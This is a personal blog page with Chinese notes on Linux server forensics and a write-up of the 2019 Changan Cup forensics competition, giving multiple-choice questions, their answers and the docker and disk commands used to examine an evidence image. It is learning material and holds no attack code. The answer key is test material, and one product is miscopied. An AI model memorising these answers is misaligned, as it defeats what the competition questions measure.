<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://jszmwq.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/g.jpg">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.4.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="/img/image.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">所有文章</a></li>
                        
                            <li><a  href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">玩转开发工具</a></li>
                        
                            <li><a  href="/categories/digital">玩转数码</a></li>
                        
                            <li><a  href="/categories/algorithm">算法学习</a></li>
                        
                            <li><a  href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/crypto/" style="font-size: 15px;">crypto</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%85%A5%E9%97%A8/" style="font-size: 10px;">博客入门</a> <a href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" style="font-size: 20px;">电子数据取证</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/image.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">玩转开发工具</a></li>
                
                    <li><a href="/categories/digital">玩转数码</a></li>
                
                    <li><a href="/categories/algorithm">算法学习</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-linux服务器取证" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/16/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/" class="article-date">
      <time datetime="2021-10-16T10:02:58.000Z" itemprop="datePublished">2021-10-16</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/16/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81/">linux服务器取证</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="Linux取证场景"><a href="#Linux取证场景" class="headerlink" title="Linux取证场景"></a>Linux取证场景</h2><h3 id="日志检查"><a href="#日志检查" class="headerlink" title="日志检查"></a>日志检查</h3><p>系统的开关机，用户登录，各种的服务的启动、关闭、故障，用户的操作历史等等，都会在本地或者其他地方留下痕迹</p>
<h3 id="容器检查"><a href="#容器检查" class="headerlink" title="容器检查"></a>容器检查</h3><p>容器虚拟化可以方便地在服务器上部署服务群集。VM、Docker、K&amp;s(Kubernetes)，虚拟机-&gt;容器虚拟化-&gt;虚拟集群</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>分析应用程序的工作目录，寻找引用属性、配置，从而进行场景复现和证据收集</p>
<h2 id="Linux-FHS"><a href="#Linux-FHS" class="headerlink" title="Linux FHS"></a>Linux FHS</h2><table>
<thead>
<tr>
<th>说明</th>
<th>目录</th>
</tr>
</thead>
<tbody><tr>
<td><code>/</code></td>
<td>根目录，根目录下一般只有以下文件夹，没有文件</td>
</tr>
<tr>
<td><code>/bin</code></td>
<td>存放了系统命令的可执行文件，例如<code>cat</code>、<code>vi</code>，相当于Windows的系统环境变量<code>PATH?</code></td>
</tr>
<tr>
<td><code>/home</code></td>
<td>用户文件夹，例如/home/user1，/home/user2</td>
</tr>
<tr>
<td><code>/usr</code></td>
<td>存放了用户应用的可执行文件、代码、动态链接库等等，相当于Windows的用户环境变量PATH</td>
</tr>
<tr>
<td><code>/usr/bin</code></td>
<td>用户安装的应用可执行文件</td>
</tr>
<tr>
<td><code>/usr/doc</code></td>
<td><code>linux</code>文档</td>
</tr>
<tr>
<td><code>/usr/include</code></td>
<td>头文件目录</td>
</tr>
<tr>
<td><code>/usr/lib</code></td>
<td>存放动态链接库、软件包配置文件</td>
</tr>
<tr>
<td><code>/usr/man</code></td>
<td>执行man命令显示的帮助文档</td>
</tr>
<tr>
<td><code>/usr/src</code></td>
<td>源代码，例如<code>linux</code>内核源码：<code>/user/src/linux</code></td>
</tr>
<tr>
<td><code>/usr/local</code></td>
<td>本机单独增加的命令、动态链接库</td>
</tr>
<tr>
<td><code>/root</code></td>
<td>root用户的用户文件夹被单独拿出来放到root目录里，不在home目录里</td>
</tr>
<tr>
<td><code>/etc</code></td>
<td>存放了系统配置，例如release</td>
</tr>
<tr>
<td><code>/opt</code></td>
<td>可选应用程序的安装目录</td>
</tr>
<tr>
<td><code>/dev</code></td>
<td>存放设备文件（分字符设备和块设备）</td>
</tr>
<tr>
<td><code>/boot</code></td>
<td>系统引导</td>
</tr>
<tr>
<td>/lib</td>
<td>存放跟文件系统中的应用程序所需要的共享库级内核模块。共享库又叫动态链接共享库，作用类似windows里的<code>.dll</code>文件，存放了根文件系统程序运行所需的共享文件。</td>
</tr>
<tr>
<td><code>/tmp</code></td>
<td>临时文件夹</td>
</tr>
<tr>
<td><code>/var/log</code></td>
<td>日志</td>
</tr>
<tr>
<td><code>/lost+found</code></td>
<td>意外丢失的文件</td>
</tr>
<tr>
<td><code>/proc</code></td>
<td>虚假的目录，磁盘中并不存在，其中的内容是系统映射出来的信息</td>
</tr>
</tbody></table>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="用户登录与操作历史"><a href="#用户登录与操作历史" class="headerlink" title="用户登录与操作历史"></a>用户登录与操作历史</h3><p><code>wtmp</code>文件：记录了用户登录历史和登陆时间</p>
<p><code>btmp</code>文件：记录了未能成功登录的用户名、时间、来源</p>
<p><code>.bash_history</code>：在每个用户的用户文件夹中，记录了该用户使用Bash执行过的命令</p>
<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><p>FTP的登录记录</p>
<p>MySQL的登陆记录</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/" rel="tag">电子数据取证</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-长安杯2019例题笔记" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
      <time datetime="2021-10-13T11:02:51.000Z" itemprop="datePublished">2021-10-13</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/">长安杯2019例题笔记</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="2019长安杯Wp"><a href="#2019长安杯Wp" class="headerlink" title="2019长安杯Wp"></a>2019长安杯Wp</h2><h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><h3 id="SHA256的计算"><a href="#SHA256的计算" class="headerlink" title="SHA256的计算"></a>SHA256的计算</h3><p><code>在windows自带的PowerShell中输入</code><em><strong>（误！！！）</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-FileHash 文件路径 -Algorithm 校验的Hash值类型| Format-List</span><br></pre></td></tr></table></figure>

<p>如果不带-Algorithm参数，也就是不指明验证的Hash值类型，那么默认验证的就是SHA256值。</p>
<h4 id="正确方法："><a href="#正确方法：" class="headerlink" title="正确方法："></a>正确方法：</h4><p>右键证据文件里的检材，选择哈希值计算</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015231422448.png" alt="image-20211015231422448"></p>
<p>得到文件的SHA-256值</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015231650138.png" alt="image-20211015231650138"></p>
<blockquote>
<p>1、计算“检材 1.E01”镜像的 SHA256 值是多少（ C ）</p>
<p>A. 2b20022249e3e5d66d4bbed34ad337be5dd77b313c92dfe929aa56ed71449697</p>
<p>B. 6a574c40548110598bd4c88520d34b37d13b372066737ede3104743f986b7263</p>
<p>C. 5ee0b3809807bf8a39453695c5835cddfd33f65b4f5bee8b5670625291a6bc1c</p>
<p>D. 8495b678da27c64b54f083afefbcf9f83f94c1de133c70c175b4a784551939dd</p>
</blockquote>
<h3 id="服务器内核版本？"><a href="#服务器内核版本？" class="headerlink" title="服务器内核版本？"></a>服务器内核版本？</h3><h5 id="1：登录linux，在终端输入-cat-proc-version"><a href="#1：登录linux，在终端输入-cat-proc-version" class="headerlink" title="1：登录linux，在终端输入 cat /proc/version"></a>1：登录linux，在终端输入 <code>cat /proc/version</code></h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013191208084.png" alt="image-20211013191208084"></p>
<h5 id="2：登录linux，在终端输入-uname-a"><a href="#2：登录linux，在终端输入-uname-a" class="headerlink" title="2：登录linux，在终端输入 uname -a"></a>2：登录linux，在终端输入 <code>uname -a</code></h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013191001450.png" alt="image-20211013191001450"></p>
<h5 id="3：最省事的就是刚开机的时候会显示出来（doge）"><a href="#3：最省事的就是刚开机的时候会显示出来（doge）" class="headerlink" title="3：最省事的就是刚开机的时候会显示出来（doge）"></a>3：最省事的就是刚开机的时候会显示出来（doge）</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016004637803.png" alt="image-20211016004637803"></p>
<p>4: FMP取证结果 -&gt; 展开镜像 -&gt; 选中对应的 root -&gt; 系统痕迹 -&gt; 系统信息 -&gt; 查看产品名称和当前版本</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016004911374.png" alt="image-20211016004911374"></p>
<blockquote>
<p>2、该服务器的操作系统版本是什么（ D ） </p>
<p>A. CentOS release 6.5 (Final) </p>
<p>B. Ubuntu 16.04.3 LTS </p>
<p>C. Debian GNU/Linux 7.8 (wheezy) </p>
<p>D.CentOS Linux release 7.6.1810(Core) </p>
</blockquote>
<blockquote>
<p>3、该服务器内核版本是多少（ A ）</p>
<p>A.3.10.0-957.el7.x86_64 </p>
<p>B. 3.2.0-4-amd64 </p>
<p>C. 4.8.0-52-generic </p>
<p>D. 4.10.0-28-generic</p>
</blockquote>
<h3 id="硬盘分区？"><a href="#硬盘分区？" class="headerlink" title="硬盘分区？"></a>硬盘分区？</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><h5 id="输入-fdisk-l-可以查看挂载那些硬盘分区，即可得到关于磁盘分区的详情信息"><a href="#输入-fdisk-l-可以查看挂载那些硬盘分区，即可得到关于磁盘分区的详情信息" class="headerlink" title="输入 fdisk -l 可以查看挂载那些硬盘分区，即可得到关于磁盘分区的详情信息"></a>输入 <code>fdisk -l</code> 可以查看挂载那些硬盘分区，即可得到关于磁盘分区的详情信息</h5><h5 id="输入-lvdisplay-可以看到逻辑卷的详细信息"><a href="#输入-lvdisplay-可以看到逻辑卷的详细信息" class="headerlink" title="输入 lvdisplay 可以看到逻辑卷的详细信息"></a>输入 <code>lvdisplay</code> 可以看到逻辑卷的详细信息</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013192540678.png" alt="image-20211013192540678"></p>
<p>逻辑区块地址<code>(Logical Block Address, LBA)</code>是描述计算机存储设备上数据所在区块的通用机制，一般用在像硬盘这样的辅助记忆设备。<code>LBA</code>可以意指某个数据区块的地址或是某个地址所指向的数据区块。</p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><blockquote>
<p>4、原服务器存在多少硬盘分区？（ B ）</p>
<p>A.1   B.2   C.3   D.4</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016005125784.png" alt="image-20211016005125784"></p>
<blockquote>
<p>5、原服务器中硬盘分区其中含有一个 LVM 逻辑卷的分区，请找出该分区内开始的逻辑区块地址<code>（LBA）</code>。（答案格式： 扇区，<code>Sector</code>）（<strong>C</strong>）</p>
<p><code>A.0    B.2048    C.2099200    D.4194344</code></p>
</blockquote>
<p>通过查找知道题目所说的分区是：<code>FMP</code>证据文件 -&gt; 展开镜像 -&gt; 选中 分区2 -&gt; 摘要 -&gt; 查看 物理位置：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015232231379.png" alt="image-20211015232231379"></p>
<p>但是这个内存物理地址的单位是字节<code>（Byte）</code>，而一个逻辑区块占用512位，所以要将这个值除以512。</p>
<p><code>1074790400/512=2099200</code></p>
<blockquote>
<p>7、该 LVM 逻辑卷分区内 root 逻辑卷的物理大小是多少？（单位：byte）（ C ）</p>
<p>A. 2,147,483,648   B. 2,147,504,128   C. 18,249,416,704   D. 20,400,046,080</p>
</blockquote>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016005445924.png" alt="image-20211016005445924"></p>
<p>可以用 512 * 35643392 = 1824941670 从而得出 C选项</p>
<p>也可以用 17 *1024 * 1024 * 1024 = 18253611008 约等于 1824941670</p>
<h4 id="逻辑卷的文件系统"><a href="#逻辑卷的文件系统" class="headerlink" title="逻辑卷的文件系统"></a>逻辑卷的文件系统</h4><blockquote>
<p>6、该 LVM 逻辑卷分区内 root 逻辑卷的文件系统是什么？（ D ）</p>
<p>A.NTFS  B.EXT4  C.SWAP  D.XFS</p>
</blockquote>
<p>通过查找知道题目所说的分区是：<code>FMP</code>证据文件 -&gt; 展开镜像 -&gt; 选中对应的 root -&gt; 摘要 -&gt; 查看 分区类型：</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211015232205519.png" alt="image-20211015232205519"></p>
<h3 id="docker？"><a href="#docker？" class="headerlink" title="docker？"></a>docker？</h3><h5 id="输入-docker-images-查看本地所有的镜像"><a href="#输入-docker-images-查看本地所有的镜像" class="headerlink" title="输入 docker images 查看本地所有的镜像"></a>输入 <code>docker images</code> 查看本地所有的镜像</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013201717153.png" alt="image-20211013201717153"></p>
<blockquote>
<p>17、该服务器中网站运行在 docker 容器中，其中 web 服务使用的是什么应用？（ C ） </p>
<p>A.apache   B.tomcat   C.nginx   D.IIS </p>
</blockquote>
<p>除了nginx选项，其他均未出现在上面的镜像中</p>
<blockquote>
<p>18、上题所述运行 web 服务的容器节点，使用的镜像名称是什么？（格式 REPOSITORY：TAG） （ D ）</p>
<p>A.apache: latest   B.tomcat: jessie-slim   C.nginx: jessie-slim   D.nginx: latest</p>
</blockquote>
<p>REPOSITORY ： TAG即可</p>
<h5 id="输入-docker-version-可以获得版本信息"><a href="#输入-docker-version-可以获得版本信息" class="headerlink" title="输入 docker version 可以获得版本信息"></a>输入 <code>docker version</code> 可以获得版本信息</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013202020275.png" alt="image-20211013202020275"></p>
<h5 id="docker-ps-的相关指令"><a href="#docker-ps-的相关指令" class="headerlink" title="docker ps 的相关指令"></a><code>docker ps</code> 的相关指令</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211013202625279.png" alt="image-20211013202625279"></p>
<h5 id="docker-ps-显示正在运行中的容器节点"><a href="#docker-ps-显示正在运行中的容器节点" class="headerlink" title="docker ps 显示正在运行中的容器节点"></a><code>docker ps</code> 显示正在运行中的容器节点</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014225650326.png" alt="image-20211014225650326"></p>
<h5 id="docker-ps-a-显示所有的容器节点"><a href="#docker-ps-a-显示所有的容器节点" class="headerlink" title="docker ps -a 显示所有的容器节点"></a><code>docker ps -a</code> 显示所有的容器节点</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014225720208.png" alt="image-20211014225720208"></p>
<blockquote>
<p>13、在运行中的容器节点中，其中一台容器名称为 romantic_varahamihira 的容器节点，它的 hostname 是什么？（ D ）</p>
<p>A. 16fc160060c1   B. 1ef6292872e0   C. 753abb28b629   D. 53766d68636f</p>
</blockquote>
<blockquote>
<p>14、上题容器节点中，占用了主机的哪个端口？（ D ）</p>
<p>A.25   B.8012  C.8091   D.未占用端口</p>
</blockquote>
<blockquote>
<p>16、容器节点 ID 为 15debb1824e6 中，占用了主机的哪个端口？（ C ）</p>
<p>A.22    B.8091   C.39999   D.未占用端口</p>
</blockquote>
<blockquote>
<p>19、使用nginx服务的容器节点占用的容器端口是什么？（ B ）</p>
<p>A.22   B.80   C.8091   D.未占用端口</p>
</blockquote>
<p>观察上述的容器节点，在 command 一栏中找到 <code>“nginx -g”</code> 故可确定题目所指向的容器，进而找到容器端口。</p>
<p><code>docker ps</code> 命令中在<code>PORTS</code>里面显示了两个端口，前面<code>0.0.0.0</code>就是主机，也就是自己，而后面的转发端口就对应着<code>docker</code>的端口，如果只显示端口号而未绑定主机，说明为占用当前端口。(别被取证大师误导，其对是否占用无区分)</p>
<blockquote>
<p>15、在运行中的容器节点中，其中一台容器 ID 为 15debb1824e6 的容器节点，它运行了什么服 务？（ B ） </p>
<p>A.ftp   B.ssh   C.nginx   D.smtp</p>
</blockquote>
<h6 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h6><p>通过观察上述的节点信息，在command一栏中找到 <code>&quot;/user/sbin/sshd -D&quot;</code>  故得出使用了SSH服务</p>
<h6 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h6><p>在取证大师中，<code>FMP</code>取证结果 -&gt; 展开镜像 -&gt; 选中对应的 root -&gt; web服务器 -&gt; Docker -&gt; 容器信息 查看 取证列表 -&gt; 找到对应的容器ID -&gt; 双击打开，在txt文本中使用搜索功能，对上述选项进行搜索，发现仅存在 ssh，故选 ssh</p>
<h5 id="输入-docker-info-可以看到关于docker配置的相关信息"><a href="#输入-docker-info-可以看到关于docker配置的相关信息" class="headerlink" title="输入 docker info 可以看到关于docker配置的相关信息"></a>输入 <code>docker info</code> 可以看到关于docker配置的相关信息</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014230344942.png" alt="image-20211014230344942"></p>
<p>或者在取证大师中可以数出个数</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016010338036.png" alt="image-20211016010338036"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016010354693.png" alt="image-20211016010354693"></p>
<blockquote>
<p>9、该服务器中运行了 docker 应用，在本地有多少 docker 镜像？（ B ）</p>
<p>A.10   B.11   C.12   D.13</p>
</blockquote>
<p>images 意思是镜像</p>
<blockquote>
<p>10、该 docker 应用的 server 版本是多少？（ C ）</p>
<p>A.16.05.2   B.17.03.8   C.18.09.7   D.19.03.3</p>
</blockquote>
<blockquote>
<p>11、该 docker 应用中总共有多少容器节点？（ A ）</p>
<p>A.10   B.11   C.12   D.13</p>
</blockquote>
<blockquote>
<p>12、运行中的容器节点有多少？（ C ）</p>
<p>A.1   B.2   C.3   D.4</p>
</blockquote>
<h5 id="输入docker-inspect-容器ID-可以查看该容器的详情信息"><a href="#输入docker-inspect-容器ID-可以查看该容器的详情信息" class="headerlink" title="输入docker inspect [容器ID] 可以查看该容器的详情信息"></a>输入<code>docker inspect [容器ID]</code> 可以查看该容器的详情信息</h5><p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014233723662.png" alt="image-20211014233723662"></p>
<p>可以找出个容器节点于主机之间的网络连接模式是 ‘bridge’</p>
<blockquote>
<p>24、在 docker 中，各容器节点和主机之间的网络连接模式是什么？（ A ）</p>
<p>A. bridge 模式   B. host 模式   C. container 模式   D.none 模式</p>
</blockquote>
<p>或者在取证大师中 自动取证 -&gt; root -&gt; Web服务器 -&gt; Docker -&gt; 容器信息 拉伸条后拉可以找到网络方式。</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016010451595.png" alt="image-20211016010451595"></p>
<h5 id="可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径"><a href="#可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径" class="headerlink" title="可以输入 docker exec -it [容器ID前两位即可] /bin/bash ， 查找相关文件的容器内部路径"></a>可以输入 <code>docker exec -it [容器ID前两位即可] /bin/bash</code> ， 查找相关文件的容器内部路径</h5><p>进入容器内部只需 <code>ls</code> 和 <code>cd [文件夹名]</code> 即可</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211014233253875.png" alt="image-20211014233253875"></p>
<blockquote>
<p>20、网站目录所在的容器内部路径为（格式：容器 ID：路径）（ B ） </p>
<p>A. d1085c1a8828:/home/ vue2-element-touzi-admin </p>
<p>B. 53766d68636f:/ home/ vue2-element-touzi-admin </p>
<p>C. 16fc160060c1:/var/www/ vue2-element-touzi-admin </p>
<p>D. 15debb1824e6: /var/www/ vue2-element-touzi-admin</p>
</blockquote>
<p>在取证大师里面实时搜索“vue2-element-touzi-admin“，点击命中文件名， 右端显示搜索到的文件，右键选择跳转到源文件</p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016014425179.png" alt="image-20211016014425179"></p>
<p><img src="/2021/10/13/%E9%95%BF%E5%AE%89%E6%9D%AF2019%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211016013230087.png" alt="image-20211016013230087"></p>
<blockquote>
